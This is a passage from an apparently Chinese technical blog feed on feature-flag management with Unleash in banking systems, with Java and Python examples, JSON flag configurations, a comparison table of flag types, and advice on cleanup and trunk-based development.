class="title">AccountService</span><span class="params">(Unleash unleash, AuditLogger auditLogger)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.unleash = unleash;</span><br><span class="line">        <span class="keyword">this</span>.auditLogger = auditLogger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Balance <span class="title">getBalance</span><span class="params">(String accountNo)</span> <span class="keyword">throws</span> BankSystemException </span>&#123;</span><br><span class="line">        <span class="comment">// 构建Unleash上下文</span></span><br><span class="line">        UnleashContext context = UnleashContext.builder()</span><br><span class="line">            .addProperty(<span class="string">&quot;accountType&quot;</span>, getAccountType(accountNo))</span><br><span class="line">            .addProperty(<span class="string">&quot;timeWindow&quot;</span>, </span><br><span class="line">                java.time.LocalTime.now().getHour() &lt; <span class="number">6</span> ? <span class="string">&quot;low-traffic&quot;</span> : <span class="string">&quot;peak&quot;</span>)</span><br><span class="line">            .addProperty(<span class="string">&quot;accountNo&quot;</span>, accountNo) <span class="comment">// 用于单账户回退</span></span><br><span class="line">            .build();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">boolean</span> useNewDB = unleash.isEnabled(<span class="string">&quot;account_db_migration&quot;</span>, context);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Balance balance = useNewDB ? </span><br><span class="line">                newDbQuery(accountNo) : </span><br><span class="line">                legacyDbQuery(accountNo);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 影子流量比对</span></span><br><span class="line">            <span class="keyword">if</span> (useNewDB) &#123;</span><br><span class="line">                Balance legacyBalance = legacyDbQuery(accountNo);</span><br><span class="line">                auditLogger.compareResults(<span class="string">&quot;balance_query&quot;</span>, balance, legacyBalance);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> balance;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            <span class="comment">// 单账户回退（通过Unleash的个性化配置）</span></span><br><span class="line">            Map&lt;String, String&gt; fallbackConfig = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            fallbackConfig.put(<span class="string">&quot;accountNo&quot;</span>, accountNo);</span><br><span class="line">            unleash.more().updateContext(<span class="string">&quot;account_db_migration&quot;</span>, </span><br><span class="line">                <span class="string">&quot;disableForAccount&quot;</span>, fallbackConfig);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BankSystemException(<span class="string">&quot;DB_OPERATION_FAILED&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> Balance <span class="title">newDbQuery</span><span class="params">(String accountNo)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 新数据库查询实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> Balance <span class="title">legacyDbQuery</span><span class="params">(String accountNo)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 旧数据库查询实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getAccountType</span><span class="params">(String accountNo)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取账户类型逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unleash 配置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;account_db_migration&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;银行核心系统数据库迁移开关&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;gradualRollout&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;rollout&quot;</span>: <span class="string">&quot;30&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;stickiness&quot;</span>: <span class="string">&quot;accountType&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;groupId&quot;</span>: <span class="string">&quot;migration&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;flexibleRollout&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;rollout&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;stickiness&quot;</span>: <span class="string">&quot;timeWindow&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;groupId&quot;</span>: <span class="string">&quot;low-traffic&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;userWithId&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;userIds&quot;</span>: <span class="string">&quot;disabled_account_1,disabled_account_2&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;variants&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;dependencies&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;banking&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;core-system&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;impressionData&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;segments&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">&quot;constraints&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;timeWindow&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;IN&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;low-traffic&quot;</span>],</span><br><span class="line">          <span class="attr">&quot;caseInsensitive&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-Permission-Flags（权限控制）​​"><a href="#5-Permission-Flags（权限控制）​​" class="headerlink" title="5. Permission Flags（权限控制）​​"></a><strong>5. Permission Flags（权限控制）​</strong>​</h3><p>​<strong>场景</strong>​：企业网银大额审批功能<br>​<strong>设计模式</strong>​：RBAC + 实时权限同步</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.getunleash.Unleash;</span><br><span class="line"><span class="keyword">import</span> io.getunleash.UnleashContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/transfer&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransferApprovalController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Unleash unleash;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AuditLogger auditLogger;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransferApprovalController</span><span class="params">(Unleash unleash, AuditLogger auditLogger)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.unleash = unleash;</span><br><span class="line">        <span class="keyword">this</span>.auditLogger = auditLogger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/approve-large&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; approveLargeTransfer(</span><br><span class="line">            <span class="meta">@RequestBody</span> TransferRequest request,</span><br><span class="line">            <span class="meta">@RequestHeader(&quot;X-User-Info&quot;)</span> String userInfo) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 解析用户信息</span></span><br><span class="line">        User user = parseUserInfo(userInfo);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构建Unleash上下文</span></span><br><span class="line">        UnleashContext context = UnleashContext.builder()</span><br><span class="line">                .userId(user.getId())</span><br><span class="line">                .addProperty(<span class="string">&quot;roles&quot;</span>, String.join(<span class="string">&quot;,&quot;</span>, user.getRoles()))</span><br><span class="line">                .addProperty(<span class="string">&quot;amount&quot;</span>, String.valueOf(request.getAmount()))</span><br><span class="line">                .addProperty(<span class="string">&quot;branchCode&quot;</span>, user.getBranchCode())</span><br><span class="line">                .addProperty(<span class="string">&quot;currency&quot;</span>, request.getCurrency())</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查权限</span></span><br><span class="line">        <span class="keyword">boolean</span> isApprovalAllowed = unleash.isEnabled(<span class="string">&quot;large_transfer_approval&quot;</span>, context);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isApprovalAllowed) &#123;</span><br><span class="line">            auditLogger.logAccessViolation(user.getId(), <span class="string">&quot;large_transfer_approval_denied&quot;</span>, request);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.FORBIDDEN)</span><br><span class="line">                    .body(<span class="keyword">new</span> ErrorResponse(<span class="string">&quot;超出审批权限&quot;</span>, <span class="string">&quot;INSUFFICIENT_PRIVILEGES&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行审批逻辑</span></span><br><span class="line">        <span class="keyword">return</span> processApproval(request, user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> User <span class="title">parseUserInfo</span><span class="params">(String userInfo)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 解析JWT或其它用户信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ResponseEntity&lt;?&gt; processApproval(TransferRequest request, User user) &#123;</span><br><span class="line">        <span class="comment">// 审批逻辑实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>unleash admin 配置如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;large_transfer_approval&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;大额转账审批权限控制&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;userWithId&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;constraints&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;roles&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;STR_CONTAINS&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;branch_manager&quot;</span>],</span><br><span class="line">              <span class="attr">&quot;caseInsensitive&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;amount&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;NUM_LTE&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;1000000&quot;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;constraints&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;branchCode&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;IN&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;SHANGHAI&quot;</span>, <span class="string">&quot;BEIJING&quot;</span>],</span><br><span class="line">              <span class="attr">&quot;caseInsensitive&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;amount&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;NUM_LTE&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;5000000&quot;</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">&quot;contextName&quot;</span>: <span class="string">&quot;currency&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;IN&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;values&quot;</span>: [<span class="string">&quot;CNY&quot;</span>, <span class="string">&quot;USD&quot;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;variants&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;security&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;high&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;impressionData&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>架构模式</tag>
        <tag>产品设计</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程之特性管理-feature-management-day-three</title>
    <url>/2025/06/19/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-three/</url>
    <content><![CDATA[<p>涵盖五种Feature Flag类型的多维度差异分析：</p>
<table>
<thead>
<tr>
<th>​<strong>维度</strong>​</th>
<th>​<strong>Release Flags</strong>​</th>
<th>​<strong>Experiment Flags</strong>​</th>
<th>​<strong>Kill Switches</strong>​</th>
<th>​<strong>Operational Flags</strong>​</th>
<th>​<strong>Permission Flags</strong>​</th>
</tr>
</thead>
<tbody><tr>
<td>​<strong>目的</strong>​</td>
<td>渐进发布新功能，降低风险</td>
<td>A/B测试或多变量实验</td>
<td>紧急关闭故障功能</td>
<td>技术实现切换（如库升级）</td>
<td>基于角色/权限控制功能访问</td>
</tr>
<tr>
<td>​<strong>触发条件</strong>​</td>
<td>用户百分比/环境配置</td>
<td>用户分桶规则（如用户ID、地理位置）</td>
<td>系统故障告警或人工干预</td>
<td>技术指标阈值（如性能基线）</td>
<td>用户属性（如订阅等级、内部权限）</td>
</tr>
<tr>
<td>​<strong>生效速度</strong>​</td>
<td>分钟级（依赖缓存/配置刷新）</td>
<td>秒级（动态分桶）</td>
<td>​<strong>毫秒级</strong>​（最高优先级）</td>
<td>秒级（自动/手动切换）</td>
<td>秒级（实时权限校验）</td>
</tr>
<tr>
<td>​<strong>影响范围</strong>​</td>
<td>特定用户群或环境</td>
<td>实验组用户</td>
<td>​<strong>全局功能</strong>​</td>
<td>局部技术组件</td>
<td>特定用户角色</td>
</tr>
<tr>
<td>​<strong>操作角色</strong>​</td>
<td>产品负责人 / 开发者</td>
<td>数据分析师/产品经理</td>
<td>SRE/高层决策者</td>
<td>运维/SRE</td>
<td>管理员/安全团队</td>
</tr>
<tr>
<td>​<strong>依赖系统</strong>​</td>
<td>CI/CD流水线+功能开关平台</td>
<td>数据分析平台（Amplitude / Mixpanel 等工具）+用户分桶服务</td>
<td>告警系统+手动触发机制</td>
<td>监控系统+配置中心</td>
<td>IAM系统或用户数据库</td>
</tr>
<tr>
<td>​<strong>预期生命周期</strong>​</td>
<td>​<strong>​≤40天</strong>​（短期功能验证）</td>
<td>​<strong>​≤40天</strong>​（实验周期）</td>
<td>​<strong>永久</strong>​（长期应急）</td>
<td>​<strong>​≤7天</strong>​（技术过渡期）</td>
<td>​<strong>永久或动态</strong>​（按业务需求）</td>
</tr>
<tr>
<td>​<strong>代码侵入性</strong>​</td>
<td>中（可通过抽象接口/策略模式缓解）</td>
<td>高（需支持多变量逻辑）</td>
<td>低（简单布尔开关）</td>
<td>中（需兼容新旧实现）</td>
<td>高（需集成权限逻辑）</td>
</tr>
<tr>
<td>​<strong>典型使用场景</strong>​</td>
<td>新购物车UI的渐进发布</td>
<td>登录页按钮颜色的转化率测试</td>
<td>支付系统故障时降级</td>
<td>数据库驱动版本迁移</td>
<td>仅向VIP用户开放高级功能</td>
</tr>
<tr>
<td>​<strong>数据要求</strong>​</td>
<td>基础使用量统计</td>
<td>​<strong>详细事件跟踪+统计分析</strong>​</td>
<td>系统健康度监控</td>
<td>技术指标日志（如延迟、错误率）</td>
<td>用户属性实时查询</td>
</tr>
<tr>
<td>​<strong>风险等级</strong>​</td>
<td>中（可能影响用户体验）</td>
<td>低（可控实验范围）</td>
<td>​<strong>高</strong>​（直接影响业务）</td>
<td>中（技术风险）</td>
<td>低（权限错误可能导致功能泄露）</td>
</tr>
<tr>
<td>​<strong>清理优先级</strong>​</td>
<td>高（避免技术债务）</td>
<td>中（实验结束即清理）</td>
<td>不适用</td>
<td>​<strong>最高</strong>​（影响性能 / 代码稳定性，需快速清理）</td>
<td>低（长期存在）</td>
</tr>
</tbody></table>
<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ol>
<li>​<strong>生命周期管理</strong>​<ul>
<li>Release/Experiment flags会标记为<strong>Potentially Stale</strong>超期后，需定期审查</li>
<li>Kill switches和Permission flags支持<strong>永久存活</strong>，但需定期测试有效性</li>
</ul>
</li>
<li>​<strong>依赖关系</strong>​<ul>
<li>Experiment flags可能依赖<strong>Parent Flag</strong>实现分层实验</li>
<li>Permission flags通常与(AWS)<strong>IAM系统深度集成</strong>​</li>
</ul>
</li>
<li>​<strong>高级控制</strong>​<ul>
<li>Release flags支持<strong>渐进式Rollout</strong>​</li>
<li>Operational flags推荐与<strong>Canary发布</strong>结合使用</li>
</ul>
</li>
<li>​<strong>安全合规</strong>​<ul>
<li>Kill switches需<strong>独立于主系统</strong>的触发机制</li>
<li>Permission flags需支持<strong>审计日志</strong>​</li>
</ul>
</li>
</ol>
<h3 id="深入分析Operational-Flag示例"><a href="#深入分析Operational-Flag示例" class="headerlink" title="深入分析Operational Flag示例"></a>深入分析Operational Flag示例</h3><p><img src="/2025/06/19/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-three/1.png"><br><strong>双保险机制</strong>​：</p>
<ol>
<li>Canary控制<strong>业务流量分配</strong>​（哪些用户的请求进入新流程）</li>
<li>Operational Flag控制<strong>技术实现路由</strong>​（实际访问新DB还是旧DB）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 银行支付路由伪代码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_payment</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="comment"># Canary控制：5%流量进入新系统</span></span><br><span class="line">    <span class="keyword">if</span> canary.is_selected(request.user_id):</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Operational Flag控制：新系统是否真正处理</span></span><br><span class="line">        <span class="keyword">if</span> operational_flag.is_enabled(<span class="string">&quot;new_payment_engine&quot;</span>):</span><br><span class="line">            result = new_engine.process(request)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 影子流量比对</span></span><br><span class="line">            old_result = old_engine.process(request)</span><br><span class="line">            - compare_results(result, old_result)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> old_engine.process(request)  <span class="comment"># 仅流量路由，不实际处理</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 非Canary流量</span></span><br><span class="line">    <span class="keyword">return</span> old_engine.process(request)</span><br></pre></td></tr></table></figure>

<p><strong>Unleash双策略配置</strong>​:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;new_payment_engine&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;gradualRollout&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;rollout&quot;</span>: <span class="number">100</span>,  <span class="comment">// 完全开启后才会生效</span></span><br><span class="line">            <span class="attr">&quot;stickiness&quot;</span>: <span class="string">&quot;serviceLoad&quot;</span>, <span class="comment">// &quot;userId&quot;, &quot;sessionId&quot;, &quot;random&quot;</span></span><br><span class="line">            <span class="attr">&quot;groupId&quot;</span>: <span class="string">&quot;low_traffic_window&quot;</span>  <span class="comment">// 仅系统负载&lt;40%时生效</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>银行级最佳实践</strong></p>
<ul>
<li><p>​分层验证​：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">```text</span><br><span class="line">Phase 1 - Canary发布 (1%流量):</span><br><span class="line">  │</span><br><span class="line">  ├── Operational Flag OFF → 仅收集基础设施指标,如 CPU Load / Latency</span><br><span class="line">  │</span><br><span class="line">  └── Operational Flag ON → 全功能验证</span><br><span class="line"></span><br><span class="line">Phase 2 - 渐进式Rollout (10% → 50% → 100%):</span><br><span class="line">  │</span><br><span class="line">  ├── 按客户价值分群（VIP优先）</span><br><span class="line">  │</span><br><span class="line">  └── 按地域分步（监管宽松区先行）</span><br><span class="line"></span><br><span class="line">Phase 3 - 全量发布:</span><br><span class="line">  ├── 移除Flag或转为永久配置</span><br><span class="line">  └── 清理弃用代码分支</span><br></pre></td></tr></table></figure>
</li>
<li><p>熔断策略​：</p>
<ul>
<li>当新DB查询延迟&gt;500ms时，基于 Prometheus / NewRelic 等监控告警系统自动触发,自动关闭Operational Flag</li>
<li>Canary流量自动降级到旧DB，但不中断服务</li>
</ul>
</li>
<li><p>​合规审计​：</p>
<ul>
<li>记录所有Flag切换操作（满足SOX审计）</li>
<li>Canary和Operational的决策日志关联到同一TraceID</li>
</ul>
</li>
<li><p>禁止循环依赖（如FlagA依赖FlagB，FlagB又依赖FlagA）</p>
<ul>
<li>实际上，任何依赖和关联，都很容易造成feature 发版失败<h3 id="监控与清理-​"><a href="#监控与清理-​" class="headerlink" title="监控与清理**​"></a>监控与清理**​</h3></li>
</ul>
</li>
</ul>
<p>​<strong>清理时机判断</strong>​：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagCleanupPolicy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldCleanup</span><span class="params">(FeatureFlag flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag.isStale() ||  <span class="comment">// 超过预期生命周期</span></span><br><span class="line">            (flag.getUsageRate() &lt; <span class="number">0.1</span>% &amp;&amp;  <span class="comment">// 低使用率</span></span><br><span class="line">             flag.getLastModified().olderThan(<span class="number">14</span>, DAYS));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​<strong>清理步骤</strong>​：</p>
<ol>
<li>代码中移除Flag条件判断</li>
<li>删除Unleash控制台配置。可以标记为 deprecated/stale，进行灰度移除</li>
<li>更新 <strong>架构决策记录</strong>​(ADR)</li>
</ol>
<h3 id="软件工程实践"><a href="#软件工程实践" class="headerlink" title="软件工程实践"></a>软件工程实践</h3><ol>
<li>Trunk-Based Development（主干开发）<br>是解决 Feature Flag 依赖关系混乱的治本之道，尤其是在银行这类高合规要求的场景下。<br><img src="/2025/06/19/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-three/2.png"></li>
<li>​<strong>小批量提交</strong>​：每个PR仅包含1个Flag的完整变更集</li>
<li>​<strong>Flag封装</strong>​：通过接口隔离实现细节<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 银行支付系统示例</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RiskEngine</span> </span>&#123;</span><br><span class="line">    <span class="function">Result <span class="title">calculateRisk</span><span class="params">(Transaction tx)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过Flag选择实现</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RiskEngine <span class="title">getEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unleash.isEnabled(<span class="string">&quot;risk_v2&quot;</span>) ? </span><br><span class="line">        <span class="keyword">new</span> RiskEngineV2() : </span><br><span class="line">        <span class="keyword">new</span> RiskEngineV1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>面向接口编程</strong>：降低代码冲突率，明确代码块的责任。本类或者方法的代码变更，不要影响其他类和方法</li>
<li><strong>依赖关系静态分析​</strong><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">❌ 检测到禁止的依赖链:</span><br><span class="line">payment.v3 -&gt; risk.v2 -&gt; data.v1 -&gt; payment.v3</span><br></pre></td></tr></table></figure></li>
<li><strong>架构决策记录（ADR）​</strong><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># ADR-042: 风控系统Flag依赖规范</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 决策</span></span><br><span class="line"><span class="bullet">-</span> 所有风控相关Flag必须单向依赖</span><br><span class="line"><span class="bullet">-</span> 禁止跨业务域Flag耦合</span><br><span class="line"></span><br><span class="line"><span class="section">## 执行</span></span><br><span class="line"><span class="code">    C[支付Flag] --&gt; A</span></span><br><span class="line"><span class="code">    D[审计Flag] --&gt; A</span></span><br><span class="line"><span class="code">    A[风控Flag] --&gt; B[数据层Flag]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>7. 分层解耦模式</strong>​<br>​<strong>代码结构</strong>​：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">src/</span><br><span class="line">├── features/</span><br><span class="line">│   ├── risk<span class="emphasis">_v2/       # 包含完整特性代码</span></span><br><span class="line"><span class="emphasis">│   │   ├── RiskEngineV2.java</span></span><br><span class="line"><span class="emphasis">│   │   └── RiskEngineTest.java</span></span><br><span class="line"><span class="emphasis">│   └── payment_</span>v3/</span><br><span class="line">└── feature<span class="emphasis">_flags/     # 集中管理所有Flag</span></span><br><span class="line"><span class="emphasis">    ├── RiskFlags.java # 显式声明依赖关系</span></span><br><span class="line"><span class="emphasis">    └── PaymentFlags.java</span></span><br></pre></td></tr></table></figure>
<ol start="8">
